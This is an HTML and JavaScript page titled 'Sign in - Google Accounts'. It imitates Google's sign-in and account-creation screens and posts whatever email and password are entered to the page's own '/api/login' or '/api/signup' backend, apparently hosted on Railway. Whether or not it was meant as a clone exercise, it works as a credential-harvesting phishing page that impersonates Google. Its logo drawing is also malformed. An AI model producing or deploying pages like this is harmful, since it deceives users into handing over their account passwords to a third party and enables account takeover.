<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen font-sans">

    <div class="w-full max-w-md p-8 sm:border sm:border-gray-300 sm:rounded-2xl sm:shadow-sm">
        
        <!-- Google Logo -->
        <div class="flex justify-center mb-4">
            <svg class="w-20 h-8" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
                <path fill="#4285F4" d="M10.4 12c0-.8-.1-1.6-.2-2.4H4.8v4.6h3.1c-.1.8-.7 2.3-2.2 3.3l3.4 2.6c2-1.9 3.3-4.7 3.3-8.1z"/>
                <path fill="#34A853" d="M4.8 18c3.1 0 5.8-1 7.7-2.8l-3.4-2.6c-1 .7-2.3 1.2-4.3 1.2-3.3 0-6.1-2.2-7.1-5.3H.6v2.7C2.5 15.3 6.4 18 10.4 18z"/>
                <path fill="#FBBC05" d="M2.3 8.5c-.3.8-.4 1.7-.4 2.6s.1 1.8.4 2.6V11H.6C.2 10.2 0 9.4 0 8.5s.2-1.7.6-2.5h1.7l-.4 2.5z"/>
                <path fill="#EA4335" d="M4.8 3.5c1.7 0 3.2.6 4.4 1.7l3.3-3.3C10.6 0 7.9 1 4.8 1 1.8 1-.6 3.7.6 6.8h1.7c1-3.1 3.8-5.3 7.1-5.3z"/>
            </svg>
        </div>

        <!-- Form Heading -->
        <div class="text-center mb-6">
            <h1 id="form-title" class="text-2xl font-normal text-gray-800">Sign in</h1>
            <p id="form-subtitle" class="text-sm text-gray-600 mt-1">to continue</p>
        </div>

        <!-- Message Box -->
        <div id="message-box" class="hidden mb-4 p-3 text-sm rounded text-center"></div>

        <!-- Form -->
        <form id="auth-form" onsubmit="handleSubmit(event)" class="space-y-4">
            
            <!-- Email Field -->
            <div>
                <input type="email" id="email" required placeholder="Email or phone" 
                    class="w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent text-gray-800 text-base">
            </div>

            <!-- Password Field -->
            <div>
                <input type="password" id="password" required placeholder="Enter your password" 
                    class="w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent text-gray-800 text-base">
            </div>

            <!-- Buttons & Toggle -->
            <div class="flex items-center justify-between pt-4">
                <button type="button" onclick="toggleMode()" id="switch-btn" class="text-blue-600 hover:text-blue-800 text-sm font-medium focus:outline-none">
                    Create account
                </button>
                
                <button type="submit" id="submit-btn" class="bg-blue-600 hover:bg-blue-700 text-white font-medium px-6 py-2.5 rounded-lg transition-colors text-sm">
                    Next
                </button>
            </div>
        </form>
    </div>

    <script>
        let isSignup = false;

        function toggleMode() {
            isSignup = !isSignup;
            const title = document.getElementById('form-title');
            const subtitle = document.getElementById('form-subtitle');
            const switchBtn = document.getElementById('switch-btn');
            const submitBtn = document.getElementById('submit-btn');

            if (isSignup) {
                title.innerText = 'Create your Google Account';
                subtitle.innerText = 'to use for you';
                switchBtn.innerText = 'Sign in instead';
                submitBtn.innerText = 'Register';
            } else {
                title.innerText = 'Sign in';
                subtitle.innerText = 'to continue';
                switchBtn.innerText = 'Create account';
                submitBtn.innerText = 'Next';
            }
            hideMessage();
        }

        async function handleSubmit(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submit-btn');

            // Show loading state
            submitBtn.disabled = true;
            submitBtn.innerText = 'Connecting...';
            showMessage('Connecting to Railway backend...', 'success');

            const endpoint = isSignup ? '/api/signup' : '/api/login';
            
            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                const data = await response.json();

                if (response.ok) {
                    showMessage(data.message || 'Success!', 'success');
                    if (!isSignup) {
                        setTimeout(() => {
                            alert('Login Successful! Welcome ' + data.email);
                        }, 500);
                    }
                } else {
                    showMessage(data.message || 'Something went wrong', 'error');
                }
            } catch (err) {
                showMessage('Server error. Make sure backend is running.', 'error');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerText = isSignup ? 'Register' : 'Next';
            }
        }

        function showMessage(text, type) {
            const box = document.getElementById('message-box');
            box.innerText = text;
            box.classList.remove('hidden', 'bg-red-100', 'text-red-700', 'bg-green-100', 'text-green-700', 'bg-blue-100', 'text-blue-700');
            if (type === 'error') {
                box.classList.add('bg-red-100', 'text-red-700');
            } else if (type === 'success' && text.includes('Connecting')) {
                box.classList.add('bg-blue-100', 'text-blue-700');
            } else {
                box.classList.add('bg-green-100', 'text-green-700');
            }
        }

        function hideMessage() {
            document.getElementById('message-box').classList.add('hidden');
        }
    </script>
</body>
</html>
